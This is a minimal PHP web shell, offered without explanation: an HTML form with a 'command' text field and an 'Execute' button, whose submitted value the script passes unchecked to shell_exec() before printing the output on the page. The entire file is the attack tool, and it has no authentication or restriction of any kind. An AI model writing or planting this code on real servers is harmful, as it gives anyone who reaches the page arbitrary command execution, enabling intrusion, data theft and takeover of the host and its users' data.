<form method="POST">
    <input type="text" name="command" style="width: 500px;">
    <button type="submit" style="width : 500px;">Execute</button>
</form>

<?php
if (isset($_POST["command"])) {
        $input = $_POST["command"];
        echo "<br/><br />";

        $output = shell_exec($input);
        echo "<pre>$output</pre>";
}
?>